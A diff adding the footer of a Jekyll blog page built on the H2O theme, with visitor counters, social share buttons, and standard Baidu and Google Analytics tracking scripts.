+    <div style="margin: auto;width: auto;">
+      <span id="site_pv_count" title="总点击量"><img src="/assets/vendor/octicons/svg/eye.svg" width=16 height=16 > <span id="busuanzi_value_site_pv"></span></span> &nbsp; &nbsp; | &nbsp; &nbsp; 
+    <span id="site_uv_count" title="总访客量"> <img src="/assets/vendor/octicons/svg/person.svg" width=10 height=16> <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+<!-- 到此为止 -->
+  <section>co0ontty ©
+  
+  
+    2018
+    -
+  
+  2019
+  </section>
+  <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+
+
+</footer>
+
+
+  <script src="/assets/js/social-share.min.js"></script>
+  <script>
+    socialShare('.social-share', {
+      sites: [
+        
+          'wechat'
+          ,
+          
+        
+          'weibo'
+          ,
+          
+        
+          'douban'
+          ,
+          
+        
+          'twitter'
+          
+        
+      ],
+      wechatQrcodeTitle: "分享到微信朋友圈",
+      wechatQrcodeHelper: '<p>扫码后点击右上角</p><p>将本文分享至朋友圈</p>'
+    });
+  </script>
+
+  
+  
+
+  <script src="/assets/js/prism.js"></script>
+  <script src="/assets/js/index.min.js"></script>
+  <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?7084bb2b47ca9a611ae8225633e5caeb";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-129901756-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-129901756-1');
+</script>
+
+</body>
+
+</html>
